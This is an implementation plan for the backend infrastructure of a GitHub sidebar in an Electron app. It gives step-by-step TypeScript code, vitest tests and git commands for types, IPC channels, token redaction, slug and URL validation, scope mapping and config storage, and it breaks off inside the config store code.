# GitHub Sidebar — PR 1: Infrastructure

> **For agentic workers:** REQUIRED SUB-SKILL: `superpowers:subagent-driven-development` (mandatory for this plan — multi-phase with 40+ commits).

**Goal:** Ship all backend infrastructure for the GitHub sidebar: types, IPC, security primitives, auth (gh CLI + OAuth + PAT), GitHub client with cache/ETag/rate-limit shield, session-aware signal extraction, IPC handlers. No visible UI in this PR — the Config page and panel land in PR 2.

**Architecture:** Capability-routed auth profiles stored via `safeStorage`; stateless GitHub fetch wrapper with per-bucket rate-limit shield and ETag cache; session-context service combining tool-call inspection + opt-in transcript scanning; all tokens stay in main; every log line goes through redactor.

**Tech Stack:** Electron 33 + TypeScript; Node built-in `fetch`; `isomorphic-dompurify` (installed in PR 2); vitest.

**Spec:** `docs/superpowers/specs/2026-04-17-github-sidebar-design.md` (rev 3, `b765a28`).

**Branch:** `feature/github-sidebar-pr1` off `beta`. **PR target:** `beta`.

---

## Cross-Platform Notes (Windows + macOS)

This app ships as two installers (Windows `.exe` and macOS `.dmg`). Every task must work on both.

- **`gh` CLI binary:** `spawn('gh', ...)` resolves to `gh.exe` on Windows via PATHEXT and `gh` on macOS — no code change needed. But confirm in C1 tests that the `defaultGhRun` spawn works on both. If a tester has `gh` installed via scoop/chocolatey on Windows, the PATH should include it.
- **`git` binary:** Same. `spawn('git', ...)` works identically on both because electron-builder ships on systems with git in PATH (confirmed for Mac via Xcode CLT; Windows users typically have Git for Windows).
- **`safeStorage`:** uses macOS Keychain on Mac, Windows DPAPI on Windows. The `AuthProfileStore.addProfile` must always check `safeStorage.isEncryptionAvailable()` — Windows sometimes returns false on fresh installs before the user has logged in once. Handle the throw path gracefully (UI shows "OS keychain unavailable").
- **Path separators:** all paths in this plan are POSIX-style. Where we write to disk (`github-config.json`, cache), `path.join(dir, FILENAME)` handles the platform difference — never hardcode `/` or `\` in file paths.
- **File permissions:** on macOS the resources dir may require different chmod than Windows. Existing `config-manager.ts` already handles this — follow its patterns.
- **Child-process stdio:** `proc.stdin` is pipe-only on Windows; `'ignore'` for stdin works on both. Keep `stdio: ['ignore', 'pipe', 'pipe']`.

## Conventions

- **IPC channels:** namespace under existing `IPC` object in `src/shared/ipc-channels.ts` as `IPC.GITHUB_*`.
- **Session type:** the existing type is `SavedSession` in `src/shared/types.ts:49` — extend it, do NOT create a new `SessionConfig`.
- **Namespace collision:** `src/main/github-update.ts` is the existing auto-updater. This PR's new code lives in `src/main/github/` subdirectory — keep them separate, do not merge or rename.
- **Dependencies:** `marked@^15` is already installed. Do **not** reinstall. `isomorphic-dompurify` is installed in PR 2 (renderer-only need).
- **No default exports** except React components (N/A in this PR).
- **No renderer Node imports** — all fs/http/spawn in main.
- **TDD loop:** every task follows (1) write failing test → (2) run, expect FAIL → (3) implement → (4) run, expect PASS → (5) commit.
- **Commit prefixes:** `feat(github):`, `test(github):`, `refactor(github):`, `chore(github):`, `docs(github):`.
- **Run before every commit:** `npm run typecheck` (skip on pure test-content commits).

---

## File map — PR 1 only

### Shared
- CREATE `src/shared/github-types.ts`
- CREATE `src/shared/github-constants.ts`
- MODIFY `src/shared/ipc-channels.ts` (add `IPC.GITHUB_*`)
- MODIFY `src/shared/types.ts` (extend `SavedSession`)

### Main — security primitives
- CREATE `src/main/github/security/token-redactor.ts`
- CREATE `src/main/github/security/slug-validator.ts`
- CREATE `src/main/github/security/repo-url-parser.ts`

### Main — auth
- CREATE `src/main/github/auth/capability-mapper.ts`
- CREATE `src/main/github/auth/auth-profile-store.ts`
- CREATE `src/main/github/auth/gh-cli-delegate.ts`
- CREATE `src/main/github/auth/oauth-device-flow.ts`
- CREATE `src/main/github/auth/pat-verifier.ts`

### Main — GitHub client
- CREATE `src/main/github/client/etag-cache.ts`
- CREATE `src/main/github/client/rate-limit-shield.ts`
- CREATE `src/main/github/client/github-fetch.ts`
- CREATE `src/main/github/client/graphql-queries.ts`
- CREATE `src/main/github/client/rest-fallback.ts`

### Main — cache + config + session
- CREATE `src/main/github/github-config-store.ts`
- CREATE `src/main/github/cache/cache-store.ts`
- CREATE `src/main/github/session/repo-detector.ts`
- CREATE `src/main/github/session/tool-call-inspector.ts`
- CREATE `src/main/github/session/transcript-scanner.ts`
- CREATE `src/main/github/session/local-git-reader.ts`
- CREATE `src/main/github/session/session-context-service.ts`

### IPC + preload + types
- CREATE `src/main/ipc/github-handlers.ts`
- MODIFY `src/main/index.ts` (register handlers, wire session auto-detect)
- MODIFY `src/preload/index.ts` (expose `github.*`)
- MODIFY `src/renderer/types/electron.d.ts` (typings)

### Tests — one per unit module above
All under `tests/unit/github/`.

---

## Task 0.1: Branch + verify env

**Files:** none changed.

- [ ] **Step 1: Confirm beta + clean**

```bash
cd F:/CLAUDE_MULTI_APP
git fetch origin
git checkout beta
git pull --ff-only
git status
```
Expected: `On branch beta`, `Your branch is up to date with 'origin/beta'`, clean.

- [ ] **Step 2: Create feature branch**

```bash
git checkout -b feature/github-sidebar-pr1
```

- [ ] **Step 3: Verify no deps changes needed**

```bash
grep '"marked"' package.json
grep '"isomorphic-dompurify"' package.json
```
`marked` should match `^15.0.0`. `isomorphic-dompurify` should be absent (that's fine — PR 2 adds it).

- [ ] **Step 4: Verify tooling**

```bash
npm run typecheck
npx vitest run --reporter=dot
```
Expected: typecheck clean, existing tests pass.

---

## Phase A — Shared Foundations

### Task A1: Create shared GitHub types

**Files:** CREATE `src/shared/github-types.ts`.

- [ ] **Step 1: Write the file**

```ts
// src/shared/github-types.ts
// Shared types for the GitHub sidebar feature.
// NOTE: 'discussions' is intentionally omitted from Capability — per spec §11,
// Discussions are deferred from v1. Add back here when/if re-introduced.

export type Capability =
  | 'pulls'
  | 'issues'
  | 'contents'
  | 'statuses'
  | 'checks'
  | 'actions'
  | 'notifications'

export type GitHubFeatureKey =
  | 'activePR'
  | 'ci'
  | 'reviews'
  | 'linkedIssues'
  | 'notifications'
  | 'localGit'
  | 'sessionContext'

export interface RateLimitSnapshot {
  limit: number
  remaining: number
  resetAt: number
  capturedAt: number
}

export interface AuthProfile {
  id: string
  kind: 'gh-cli' | 'oauth' | 'pat-classic' | 'pat-fine-grained'
  label: string
  username: string
  avatarUrl?: string
  scopes: string[]
  capabilities: Capability[]
  allowedRepos?: string[]
  tokenCiphertext?: string
  ghCliUsername?: string
  createdAt: number
  lastVerifiedAt: number
  lastAuthErrorAt?: number
  expiresAt?: number
  expiryObservable: boolean
  rateLimits?: {
    core?: RateLimitSnapshot
    search?: RateLimitSnapshot
    graphql?: RateLimitSnapshot
  }
}

export interface GitHubSyncIntervals {
  activeSessionSec: number
  backgroundSec: number
  notificationsSec: number
}

export interface GitHubConfig {
  schemaVersion: number
  authProfiles: Record<string, AuthProfile>
  defaultAuthProfileId?: string
  featureToggles: Record<GitHubFeatureKey, boolean>
  syncIntervals: GitHubSyncIntervals
  enabledByDefault: boolean
  transcriptScanningOptIn: boolean
  seenOnboardingVersion?: string
}

export interface SessionGitHubIntegration {
  enabled: boolean
  repoUrl?: string
  repoSlug?: string
  authProfileId?: string
  autoDetected: boolean
  panelWidth?: number
  collapsedSections?: Record<string, boolean>
  dismissedAutoDetect?: boolean
}

export interface NotificationSummary {
  id: string
  type: 'review_requested' | 'mention' | 'assign' | 'subscribed' | string
  repo: string
  title: string
  url: string
  unread: boolean
  updatedAt: number
}

export interface NotificationsCache {
  etag?: string
  lastFetched: number
  items: NotificationSummary[]
}

export interface PRSnapshot {
  number: number
  title: string
  state: 'open' | 'closed' | 'merged'
  draft: boolean
  author: string
  authorAvatarUrl?: string
  createdAt: number
  updatedAt: number
  mergeableState: 'clean' | 'conflict' | 'blocked' | 'unknown'
  allowedMergeMethods?: Array<'merge' | 'squash' | 'rebase'>
  url: string
}

export interface WorkflowRunSnapshot {
  id: number
  workflowName: string
  status: 'queued' | 'in_progress' | 'completed'
  conclusion?: 'success' | 'failure' | 'cancelled' | 'skipped' | null
  durationMs?: number
  url: string
  failedJobs?: Array<{ id: number; name: string; tailLine?: string }>
}

export interface ReviewThreadSnapshot {
  id: string
  file: string
  line: number
  commenter: string
  bodyMarkdown: string
  resolved: boolean
}

export interface ReviewSnapshot {
  id: number
  reviewer: string
  reviewerAvatarUrl?: string
  state: 'APPROVED' | 'CHANGES_REQUESTED' | 'COMMENTED' | 'PENDING' | 'DISMISSED'
  threads: ReviewThreadSnapshot[]
}

export interface IssueSnapshot {
  number: number
  title: string
  state: 'open' | 'closed'
  assignee?: string
  url: string
  primary?: boolean
}

export interface StatusSnapshot {
  context: string
  state: 'success' | 'failure' | 'pending' | 'error'
  description?: string
  url?: string
}

export interface CheckRunSnapshot {
  id: number
  name: string
  status: 'queued' | 'in_progress' | 'completed'
  conclusion?: 'success' | 'failure' | 'neutral' | 'cancelled' | 'skipped' | 'timed_out' | 'action_required' | null
  detailsUrl?: string
}

export interface RepoCache {
  etags: Record<string, string>
  lastSynced: number
  pr?: PRSnapshot | null
  actions?: WorkflowRunSnapshot[]
  reviews?: ReviewSnapshot[]
  issues?: IssueSnapshot[]
  statuses?: StatusSnapshot[]
  checks?: CheckRunSnapshot[]
  accessedAt: number
}

export interface GitHubCache {
  schemaVersion: number
  repos: Record<string, RepoCache>
  notificationsByProfile: Record<string, NotificationsCache>
  lru: string[]
}

export interface ToolCallFileSignal {
  filePath: string
  at: number
  tool: 'Read' | 'Write' | 'Edit' | 'NotebookEdit' | 'MultiEdit' | 'Bash'
}

export interface TranscriptReference {
  kind: 'issue' | 'pr'
  repo?: string
  number: number
  at: number
}

export interface SessionContextResult {
  primaryIssue?: { number: number; repo?: string; title?: string; state?: 'open' | 'closed'; assignee?: string }
  otherSignals: Array<{ source: 'branch' | 'transcript' | 'pr-body'; number: number; repo?: string }>
  recentFiles: ToolCallFileSignal[]
  activePR?: { number: number; state: 'open' | 'closed' | 'merged'; draft: boolean }
}

export interface LocalGitState {
  branch?: string
  ahead: number
  behind: number
  staged: string[]
  unstaged: string[]
  untracked: string[]
  stashCount: number
  recentCommits: Array<{ sha: string; subject: string; at: number }>
}

export interface DeviceCodeResponse {
  device_code: string
  user_code: string
  verification_uri: string
  expires_in: number
  interval: number
}

export interface OAuthTokenResponse {
  access_token?: string
  token_type?: string
  scope?: string
  error?: 'authorization_pending' | 'slow_down' | 'expired_token' | 'access_denied' | string
  error_description?: string
  interval?: number
}
```

- [ ] **Step 2: Typecheck**

```bash
npm run typecheck
```
Expected: clean.

- [ ] **Step 3: Commit**

```bash
git add src/shared/github-types.ts
git commit -m "feat(github): add shared GitHub types"
```

---

### Task A2: Create shared constants

**Files:** CREATE `src/shared/github-constants.ts`.

- [ ] **Step 1: Write**

```ts
// src/shared/github-constants.ts
import type { Capability } from './github-types'

// PUBLIC OAuth Client ID — safe to commit. RFC 8628 device flow = public client,
// no client secret needed. Do NOT add a client secret here.
export const GITHUB_OAUTH_CLIENT_ID = 'Ov23liOJO5KaUDD9D1bY'

export const GITHUB_API_BASE = 'https://api.github.com'
export const GITHUB_DEVICE_CODE_URL = 'https://github.com/login/device/code'
export const GITHUB_OAUTH_TOKEN_URL = 'https://github.com/login/oauth/access_token'
export const GITHUB_DEVICE_VERIFICATION_URL = 'https://github.com/login/device'

export const GITHUB_OWNER_REGEX = /^[A-Za-z0-9](?:[A-Za-z0-9]|-(?=[A-Za-z0-9])){0,38}$/
export const GITHUB_REPO_NAME_REGEX = /^[A-Za-z0-9._-]+$/

export const BRANCH_ISSUE_REGEXES: RegExp[] = [
  /^(?:fix|feat|feature|issue|chore|bug)[-_/](\d+)/,
  /^(\d+)[-_]/,
]

export const TRANSCRIPT_ISSUE_REGEX = /#(\d+)\b/g
export const TRANSCRIPT_GH_REGEX = /\bGH-(\d+)\b/g
export const TRANSCRIPT_URL_REGEX =
  /https?:\/\/github\.com\/([A-Za-z0-9-]+)\/([A-Za-z0-9._-]+)\/(issues|pull)\/(\d+)/g

export const TOKEN_REDACTION_PATTERNS: RegExp[] = [
  /\bghp_[A-Za-z0-9]+\b/g,
  /\bgithub_pat_[A-Za-z0-9_]+\b/g,
  /\bgho_[A-Za-z0-9]+\b/g,
  /\bghu_[A-Za-z0-9]+\b/g,
  /\bghs_[A-Za-z0-9]+\b/g,
  /\bghr_[A-Za-z0-9]+\b/g,
  /\bghi_[A-Za-z0-9]+\b/g,
  /access_token=[^&\s]+/g,
]

export const DEFAULT_SYNC_INTERVALS = {
  activeSessionSec: 60,
  backgroundSec: 300,
  notificationsSec: 180,
}

export const DEFAULT_FEATURE_TOGGLES: Record<import('./github-types').GitHubFeatureKey, boolean> = {
  activePR: true,
  ci: true,
  reviews: true,
  linkedIssues: true,
  notifications: false,
  localGit: true,
  sessionContext: true,
}

export const OAUTH_SCOPES_PUBLIC = 'public_repo read:org notifications workflow'
export const OAUTH_SCOPES_PRIVATE = 'repo read:org notifications workflow'

export const CLASSIC_PAT_SCOPE_CAPABILITIES: Record<string, Capability[]> = {
  repo: ['pulls', 'issues', 'contents', 'statuses', 'checks', 'actions'],
  public_repo: ['pulls', 'issues', 'contents', 'statuses', 'checks', 'actions'],
  workflow: ['actions'],
  notifications: ['notifications'],
}

export const FINEGRAINED_PERMISSION_CAPABILITIES: Record<string, Capability[]> = {
  pull_requests: ['pulls'],
  issues: ['issues'],
  contents: ['contents'],
  statuses: ['statuses'],
  actions: ['actions'],
  // 'checks' intentionally NOT in fine-grained — GitHub removed the permission.
  // 'notifications' intentionally NOT in fine-grained — no such scope exists.
}

export const GITHUB_CONFIG_SCHEMA_VERSION = 1
export const GITHUB_CACHE_SCHEMA_VERSION = 1

export const CACHE_MAX_REPOS = 50
export const CACHE_MAX_BYTES = 10 * 1024 * 1024
export const CACHE_CORRUPT_BACKUPS_KEEP = 3
```

- [ ] **Step 2: Typecheck + commit**

```bash
npm run typecheck
git add src/shared/github-constants.ts
git commit -m "feat(github): add shared GitHub constants"
```

---

### Task A3: Add `IPC.GITHUB_*` channels

**Files:** MODIFY `src/shared/ipc-channels.ts`.

- [ ] **Step 1: Inspect the IPC object closing brace**

```bash
tail -30 src/shared/ipc-channels.ts
```
Note the last entry and the closing `} as const` (or `}`).

- [ ] **Step 2: Add keys inside the IPC object — just before the closing brace**

Append (inside the `export const IPC = { ... }` object):

```ts
  // GitHub sidebar
  GITHUB_CONFIG_GET: 'github:config:get',
  GITHUB_CONFIG_UPDATE: 'github:config:update',
  GITHUB_PROFILE_ADD_PAT: 'github:profile:addPat',
  GITHUB_PROFILE_ADOPT_GHCLI: 'github:profile:adoptGhCli',
  GITHUB_PROFILE_REMOVE: 'github:profile:remove',
  GITHUB_PROFILE_RENAME: 'github:profile:rename',
  GITHUB_PROFILE_TEST: 'github:profile:test',
  GITHUB_OAUTH_START: 'github:oauth:start',
  GITHUB_OAUTH_POLL: 'github:oauth:poll',
  GITHUB_OAUTH_CANCEL: 'github:oauth:cancel',
  GITHUB_GHCLI_DETECT: 'github:ghcli:detect',
  GITHUB_REPO_DETECT: 'github:repo:detect',
  GITHUB_SESSION_CONFIG_UPDATE: 'github:session:updateConfig',
  GITHUB_SESSION_CONTEXT_GET: 'github:session:context:get',
  GITHUB_LOCALGIT_GET: 'github:localgit:get',
  GITHUB_SYNC_NOW: 'github:sync:now',
  GITHUB_SYNC_PAUSE: 'github:sync:pause',
  GITHUB_SYNC_RESUME: 'github:sync:resume',
  GITHUB_DATA_GET: 'github:data:get',
  GITHUB_DATA_UPDATE: 'github:data:update',
  GITHUB_SYNC_STATE_UPDATE: 'github:sync:stateUpdate',
  GITHUB_ACTIONS_RERUN: 'github:actions:rerun',
  GITHUB_PR_MERGE: 'github:pr:merge',
  GITHUB_PR_READY: 'github:pr:ready',
  GITHUB_REVIEW_REPLY: 'github:review:reply',
  GITHUB_NOTIF_MARK_READ: 'github:notif:markRead',
```

- [ ] **Step 3: Typecheck + commit**

```bash
npm run typecheck
git add src/shared/ipc-channels.ts
git commit -m "feat(github): add IPC.GITHUB_* channels"
```

---

### Task A4: Extend `SavedSession` with `githubIntegration`

**Files:** MODIFY `src/shared/types.ts`.

- [ ] **Step 1: Find the SavedSession interface**

```bash
grep -n "interface SavedSession" src/shared/types.ts
```
Note the start line and closing `}`.

- [ ] **Step 2: Add the optional field**

Inside the `SavedSession` interface, before its closing `}`, add:

```ts
  githubIntegration?: import('./github-types').SessionGitHubIntegration
```

- [ ] **Step 3: Typecheck + commit**

```bash
npm run typecheck
git add src/shared/types.ts
git commit -m "feat(github): extend SavedSession with optional githubIntegration"
```

---

### Task A5: Token redactor + tests

**Files:** CREATE `src/main/github/security/token-redactor.ts`, `tests/unit/github/token-redactor.test.ts`.

- [ ] **Step 1: Write failing test**

```ts
// tests/unit/github/token-redactor.test.ts
import { describe, it, expect } from 'vitest'
import { redactTokens, wrapLogger } from '../../../src/main/github/security/token-redactor'

describe('redactTokens', () => {
  it('redacts ghp_', () => {
    expect(redactTokens('token ghp_abc123XYZ')).toBe('token [REDACTED]')
  })
  it('redacts github_pat_', () => {
    expect(redactTokens('github_pat_ABC_123xyz')).toBe('[REDACTED]')
  })
  it('redacts gho_, ghu_, ghs_, ghr_, ghi_', () => {
    expect(redactTokens('gho_1 ghu_2 ghs_3 ghr_4 ghi_5'))
      .toBe('[REDACTED] [REDACTED] [REDACTED] [REDACTED] [REDACTED]')
  })
  it('redacts access_token= URL param', () => {
    expect(redactTokens('x?access_token=secret&other=ok'))
      .toBe('x?[REDACTED]&other=ok')
  })
  it('does NOT redact public OAuth Client ID', () => {
    expect(redactTokens('client_id=Ov23liOJO5KaUDD9D1bY'))
      .toBe('client_id=Ov23liOJO5KaUDD9D1bY')
  })
  it('leaves normal text untouched', () => {
    expect(redactTokens('normal log line')).toBe('normal log line')
  })
})

describe('wrapLogger', () => {
  it('redacts only string args', () => {
    const collected: any[] = []
    const logger = wrapLogger((...a: any[]) => collected.push(...a))
    logger('Bearer ghp_X', { num: 42 }, 'normal')
    expect(collected[0]).toBe('Bearer [REDACTED]')
    expect(collected[1]).toEqual({ num: 42 })
    expect(collected[2]).toBe('normal')
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/token-redactor.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/security/token-redactor.ts
import { TOKEN_REDACTION_PATTERNS } from '../../../shared/github-constants'

export function redactTokens(line: string): string {
  let out = line
  for (const pattern of TOKEN_REDACTION_PATTERNS) {
    out = out.replace(pattern, '[REDACTED]')
  }
  return out
}

export function wrapLogger<T extends (...args: any[]) => void>(logFn: T): T {
  return ((...args: any[]) => {
    const redacted = args.map((a) => (typeof a === 'string' ? redactTokens(a) : a))
    logFn(...redacted)
  }) as T
}
```

- [ ] **Step 4: Run — expect pass**

```bash
npx vitest run tests/unit/github/token-redactor.test.ts
```

- [ ] **Step 5: Commit**

```bash
git add src/main/github/security/token-redactor.ts tests/unit/github/token-redactor.test.ts
git commit -m "feat(github): token redactor with public-client-id exemption"
```

---

### Task A6: Slug validator + tests

**Files:** CREATE `src/main/github/security/slug-validator.ts`, `tests/unit/github/slug-validator.test.ts`.

- [ ] **Step 1: Write test**

```ts
// tests/unit/github/slug-validator.test.ts
import { describe, it, expect } from 'vitest'
import { validateSlug, parseSlug } from '../../../src/main/github/security/slug-validator'

describe('validateSlug', () => {
  it('accepts valid', () => {
    expect(validateSlug('nubbymong/claude-command-center')).toBe(true)
    expect(validateSlug('123/repo')).toBe(true)
    expect(validateSlug('owner/my.repo')).toBe(true)
  })
  it('rejects bare . and ..', () => {
    expect(validateSlug('owner/.')).toBe(false)
    expect(validateSlug('owner/..')).toBe(false)
  })
  it('rejects missing or extra slashes', () => {
    expect(validateSlug('no-slash')).toBe(false)
    expect(validateSlug('a/b/c')).toBe(false)
  })
  it('rejects empty parts', () => {
    expect(validateSlug('/repo')).toBe(false)
    expect(validateSlug('owner/')).toBe(false)
    expect(validateSlug('')).toBe(false)
  })
  it('rejects owner consecutive dashes / leading / trailing dashes', () => {
    expect(validateSlug('a--b/r')).toBe(false)
    expect(validateSlug('-owner/r')).toBe(false)
    expect(validateSlug('owner-/r')).toBe(false)
  })
  it('rejects owner > 39 chars', () => {
    expect(validateSlug('a'.repeat(40) + '/r')).toBe(false)
  })
  it('rejects non-string inputs', () => {
    // @ts-expect-error testing runtime guard
    expect(validateSlug(null)).toBe(false)
    // @ts-expect-error testing runtime guard
    expect(validateSlug(123)).toBe(false)
  })
})

describe('parseSlug', () => {
  it('returns owner/repo on valid', () => {
    expect(parseSlug('nubbymong/x')).toEqual({ owner: 'nubbymong', repo: 'x' })
  })
  it('returns null on invalid', () => {
    expect(parseSlug('invalid')).toBeNull()
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/slug-validator.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/security/slug-validator.ts
import { GITHUB_OWNER_REGEX, GITHUB_REPO_NAME_REGEX } from '../../../shared/github-constants'

export function validateSlug(slug: unknown): slug is string {
  if (typeof slug !== 'string') return false
  const parts = slug.split('/')
  if (parts.length !== 2) return false
  const [owner, repo] = parts
  if (!owner || !repo) return false
  if (repo === '.' || repo === '..') return false
  if (!GITHUB_OWNER_REGEX.test(owner)) return false
  if (!GITHUB_REPO_NAME_REGEX.test(repo)) return false
  return true
}

export function parseSlug(slug: string): { owner: string; repo: string } | null {
  if (!validateSlug(slug)) return null
  const [owner, repo] = slug.split('/')
  return { owner, repo }
}
```

- [ ] **Step 4: Run — pass, commit**

```bash
npx vitest run tests/unit/github/slug-validator.test.ts
git add src/main/github/security/slug-validator.ts tests/unit/github/slug-validator.test.ts
git commit -m "feat(github): slug validator (GitHub owner/repo rules)"
```

---

### Task A7: Repo URL parser + tests

**Files:** CREATE `src/main/github/security/repo-url-parser.ts`, `tests/unit/github/repo-url-parser.test.ts`.

- [ ] **Step 1: Write test**

```ts
// tests/unit/github/repo-url-parser.test.ts
import { describe, it, expect } from 'vitest'
import { parseRepoUrl } from '../../../src/main/github/security/repo-url-parser'

describe('parseRepoUrl', () => {
  it('HTTPS', () => {
    expect(parseRepoUrl('https://github.com/nubbymong/claude-command-center'))
      .toBe('nubbymong/claude-command-center')
  })
  it('HTTPS with .git', () => {
    expect(parseRepoUrl('https://github.com/a/b.git')).toBe('a/b')
  })
  it('SSH git@', () => {
    expect(parseRepoUrl('git@github.com:a/b.git')).toBe('a/b')
  })
  it('ssh:// URL', () => {
    expect(parseRepoUrl('ssh://git@github.com/a/b.git')).toBe('a/b')
  })
  it('trims whitespace', () => {
    expect(parseRepoUrl('  https://github.com/a/b\n')).toBe('a/b')
  })
  it('returns null for non-github', () => {
    expect(parseRepoUrl('https://gitlab.com/a/b')).toBeNull()
    expect(parseRepoUrl('git@gitlab.com:a/b.git')).toBeNull()
  })
  it('returns null for invalid slug', () => {
    expect(parseRepoUrl('https://github.com/-bad/x')).toBeNull()
  })
  it('returns null for empty / non-string', () => {
    expect(parseRepoUrl('')).toBeNull()
    expect(parseRepoUrl('   ')).toBeNull()
    // @ts-expect-error runtime guard
    expect(parseRepoUrl(null)).toBeNull()
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/repo-url-parser.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/security/repo-url-parser.ts
import { validateSlug } from './slug-validator'

const HTTPS_RE = /^https?:\/\/github\.com\/([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i
const SSH_RE = /^git@github\.com:([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i
const SSH_URL_RE = /^ssh:\/\/git@github\.com\/([^/\s]+)\/([^/\s]+?)(?:\.git)?$/i

export function parseRepoUrl(raw: unknown): string | null {
  if (typeof raw !== 'string') return null
  const s = raw.trim()
  if (!s) return null
  let slug: string | null = null
  let m = s.match(HTTPS_RE) ?? s.match(SSH_RE) ?? s.match(SSH_URL_RE)
  if (m) slug = `${m[1]}/${m[2]}`
  if (!slug) return null
  return validateSlug(slug) ? slug : null
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/repo-url-parser.test.ts
git add src/main/github/security/repo-url-parser.ts tests/unit/github/repo-url-parser.test.ts
git commit -m "feat(github): repo URL parser (HTTPS/SSH, github.com only)"
```

---

## Phase B — Auth Storage & Capability Mapping

### Task B1: Capability mapper + tests

**Files:** CREATE `src/main/github/auth/capability-mapper.ts`, `tests/unit/github/capability-mapper.test.ts`.

- [ ] **Step 1: Write test**

```ts
// tests/unit/github/capability-mapper.test.ts
import { describe, it, expect } from 'vitest'
import { scopesToCapabilities } from '../../../src/main/github/auth/capability-mapper'

describe('scopesToCapabilities', () => {
  it('classic repo → six caps including checks', () => {
    expect(scopesToCapabilities('classic', ['repo']).sort()).toEqual(
      ['actions', 'checks', 'contents', 'issues', 'pulls', 'statuses'].sort(),
    )
  })
  it('classic public_repo equivalent to repo', () => {
    expect(scopesToCapabilities('classic', ['public_repo']).sort()).toEqual(
      ['actions', 'checks', 'contents', 'issues', 'pulls', 'statuses'].sort(),
    )
  })
  it('notifications scope adds notifications capability', () => {
    const caps = scopesToCapabilities('classic', ['repo', 'notifications'])
    expect(caps).toContain('notifications')
  })
  it('fine-grained pull_requests → pulls only', () => {
    expect(scopesToCapabilities('fine-grained', ['pull_requests'])).toEqual(['pulls'])
  })
  it('fine-grained NEVER grants checks even with full set', () => {
    const caps = scopesToCapabilities('fine-grained', [
      'pull_requests', 'issues', 'contents', 'statuses', 'actions',
    ])
    expect(caps).not.toContain('checks')
    expect(caps).not.toContain('notifications')
  })
  it('oauth treated as classic scopes', () => {
    expect(scopesToCapabilities('oauth', ['public_repo', 'notifications']).sort()).toEqual(
      ['actions', 'checks', 'contents', 'issues', 'notifications', 'pulls', 'statuses'].sort(),
    )
  })
  it('gh-cli uses classic mapping', () => {
    expect(scopesToCapabilities('gh-cli', ['repo']).length).toBe(6)
  })
  it('deduplicates overlapping scopes', () => {
    const caps = scopesToCapabilities('classic', ['repo', 'public_repo'])
    expect(new Set(caps).size).toBe(caps.length)
  })
  it('empty scopes → empty caps', () => {
    expect(scopesToCapabilities('classic', [])).toEqual([])
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/capability-mapper.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/auth/capability-mapper.ts
import type { Capability } from '../../../shared/github-types'
import {
  CLASSIC_PAT_SCOPE_CAPABILITIES,
  FINEGRAINED_PERMISSION_CAPABILITIES,
} from '../../../shared/github-constants'

export type AuthKindForMapping = 'classic' | 'fine-grained' | 'oauth' | 'gh-cli'

export function scopesToCapabilities(
  kind: AuthKindForMapping,
  scopes: string[],
): Capability[] {
  const table =
    kind === 'fine-grained'
      ? FINEGRAINED_PERMISSION_CAPABILITIES
      : CLASSIC_PAT_SCOPE_CAPABILITIES
  const set = new Set<Capability>()
  for (const scope of scopes) {
    const caps = table[scope]
    if (caps) caps.forEach((c) => set.add(c))
  }
  return Array.from(set)
}
```

- [ ] **Step 4: Run + commit**

```bash
npx vitest run tests/unit/github/capability-mapper.test.ts
git add src/main/github/auth/capability-mapper.ts tests/unit/github/capability-mapper.test.ts
git commit -m "feat(github): scope→capability mapper"
```

---

### Task B2: GitHubConfigStore + tests

**Files:** CREATE `src/main/github/github-config-store.ts`, test.

- [ ] **Step 1: Test**

```ts
// tests/unit/github/github-config-store.test.ts
import { describe, it, expect, beforeEach } from 'vitest'
import { promises as fs } from 'node:fs'
import path from 'node:path'
import os from 'node:os'
import { GitHubConfigStore } from '../../../src/main/github/github-config-store'
import {
  GITHUB_CONFIG_SCHEMA_VERSION,
  DEFAULT_SYNC_INTERVALS,
  DEFAULT_FEATURE_TOGGLES,
} from '../../../src/shared/github-constants'

function sample() {
  return {
    schemaVersion: GITHUB_CONFIG_SCHEMA_VERSION,
    authProfiles: {},
    featureToggles: { ...DEFAULT_FEATURE_TOGGLES },
    syncIntervals: { ...DEFAULT_SYNC_INTERVALS },
    enabledByDefault: false,
    transcriptScanningOptIn: false,
  }
}

describe('GitHubConfigStore', () => {
  let tmp: string
  let store: GitHubConfigStore

  beforeEach(async () => {
    tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'ghcfg-'))
    store = new GitHubConfigStore(tmp)
  })

  it('read returns null when missing', async () => {
    expect(await store.read()).toBeNull()
  })

  it('round-trips', async () => {
    await store.write(sample())
    expect(await store.read()).toEqual(sample())
  })

  it('atomic write leaves only final file', async () => {
    await store.write(sample())
    const entries = await fs.readdir(tmp)
    expect(entries).toEqual(['github-config.json'])
  })

  it('corrupt JSON → null', async () => {
    await fs.writeFile(path.join(tmp, 'github-config.json'), 'not json', 'utf8')
    expect(await store.read()).toBeNull()
  })

  it('unknown schemaVersion → null', async () => {
    await fs.writeFile(
      path.join(tmp, 'github-config.json'),
      JSON.stringify({ schemaVersion: 9999 }),
      'utf8',
    )
    expect(await store.read()).toBeNull()
  })
})
```

- [ ] **Step 2: Run — expect fail**

```bash
npx vitest run tests/unit/github/github-config-store.test.ts
```

- [ ] **Step 3: Implement**

```ts
// src/main/github/github-config-store.ts
import { promises as fs } from 'node:fs'
import path from 'node:path'
import type { GitHubConfig } from '../../shared/github-types'
import { GITHUB_CONFIG_SCHEMA_VERSION } from '../../shared/github-constants'
import { redactTokens } from './security/token-redactor'

const FILENAME = 'github-config.json'

export class GitHubConfigStore {
  constructor(private dir: string) {}
  private get filePath() { return path.join(this.dir, FILENAME) }

  async read(): Promise<GitHubConfig | null> {
    try {
      const raw = await fs.readFile(this.filePath, 'utf8')
      const parsed = JSON.parse(raw)
      if (parsed.schemaVersion !== GITHUB_CONFIG_SCHEMA_VERSION) {
        console.warn(`[github-config] unknown schemaVersion ${parsed.schemaVersion}`)
        return null
      }
      return parsed as GitHubConfig
